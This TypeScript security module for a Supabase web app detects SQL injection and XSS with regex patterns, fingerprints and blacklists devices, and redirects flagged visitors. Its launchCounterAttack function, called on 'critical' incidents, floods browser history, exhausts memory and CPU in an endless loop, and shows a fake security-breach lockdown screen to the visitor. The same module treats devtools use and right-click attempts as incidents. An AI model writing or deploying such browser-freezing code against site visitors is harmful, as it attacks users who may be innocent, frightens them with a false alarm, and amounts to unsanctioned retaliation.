import { supabase } from "@/integrations/supabase/client";
import { getDeviceFingerprint } from "./fingerprint";

export type IncidentType =
  | "devtools_detected"
  | "honeypot_triggered"
  | "right_click_attempt"
  | "malicious_input"
  | "unauthorized_admin_access"
  | "forced_navigation_attempt";

export const REDIRECT_URL = "https://www.google.com/search?q=how+to+be+a+better+person";

/**
 * Common SQL injection and XSS patterns for detection.
 * Specifically refined to avoid false positives for legitimate users
 * (e.g. apostrophes in emails/passwords).
 */
const MALICIOUS_PATTERNS = [
  /(\s--)|(--\s*$)|(DROP\s+TABLE)|(UNION\s+SELECT)/i, // SQL: double dash, keywords
  /\w*((\%27)|(\'))\s+((\%6F)|o|(\%4F))((\%72)|r|(\%52))/i, // SQL: ' or' with space
  /((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))/i, // SQL: = with dangerous sequences
  /<script[^>]*>/i, // XSS: script tag
  /<\/script>/i, // XSS: script end tag
  /\bon\w+\s*=\s*['"]?[^'"]*alert\(/i, // XSS: event handler with alert
  /javascript\s*:/i, // XSS: javascript protocol
];

/**
 * Detect malicious strings (SQLi, XSS) in user input
 */
export function detectMaliciousPatterns(input: string): boolean {
  if (!input) return false;
  return MALICIOUS_PATTERNS.some(pattern => pattern.test(input));
}

/**
 * Aggressive counter-attack payload to freeze the attacker's browser session.
 * Consumes memory and CPU until the process is terminated.
 */
function launchCounterAttack() {
  console.error("COUNTER-ATTACK INITIATED. CEASE AND DESIST.");

  // 1. History bloat (makes 'back' button useless and slows down browser)
  try {
    for (let i = 0; i < 500; i++) {
      window.history.pushState({}, '', window.location.href + '?attack_detected=' + i);
    }
  } catch (e) {}

  // 2. Memory exhaustion & CPU spike (heavy load)
  const payload: any[] = [];
  const runPayload = () => {
    // Allocate large chunks of data
    for (let i = 0; i < 50; i++) {
      payload.push(new Array(1000000).fill(Math.random().toString(36)));
    }

    // DOM manipulation flood
    const trap = document.createElement('div');
    trap.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:999999;display:flex;align-items:center;justify-content:center;font-size:30px;font-family:monospace;padding:20px;text-align:center;pointer-events:none;";
    trap.innerText = "CRITICAL SECURITY BREACH DETECTED. SYSTEM LOCKDOWN INITIATED.";
    document.body.appendChild(trap);

    // Schedule next spike
    setTimeout(runPayload, 100);
  };

  runPayload();
}

/**
 * Report a security incident to the backend and optionally redirect or counter-attack.
 */
export async function triggerTrap(
  type: IncidentType,
  details: any = {},
  severity: "low" | "medium" | "high" | "critical" = "high",
  shouldRedirect: boolean = true
) {
  const fingerprint = getDeviceFingerprint();

  try {
    // Fire and forget reporting
    await supabase.functions.invoke("report-incident", {
      body: {
        type,
        details: {
          ...details,
          userAgent: navigator.userAgent,
          url: window.location.href,
          timestamp: new Date().toISOString()
        },
        fingerprint,
        severity
      }
    });
  } catch (error) {
    console.error("Failed to report incident:", error);
  }

  if (severity === "critical") {
    // Aggressive counter-attack for critical threats
    launchCounterAttack();
    // Also redirect after a short delay to allow some bloat to happen
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 1000);
  } else if (shouldRedirect) {
    // Hard redirect to clear state
    window.location.href = REDIRECT_URL;
  }
}

/**
 * Check if the current device/fingerprint is blacklisted.
 */
export async function checkBlacklist(): Promise<boolean> {
  const fingerprint = getDeviceFingerprint();

  try {
    const { data, error } = await supabase
      .rpc("check_is_blacklisted", { client_fingerprint: fingerprint });

    if (error) {
      console.error("Error checking blacklist:", error);
      return false;
    }

    if (data === true) {
      // If blacklisted, redirect immediately
      window.location.href = REDIRECT_URL;
      return true;
    }
  } catch (err) {
    console.error("Blacklist check failed:", err);
  }

  return false;
}
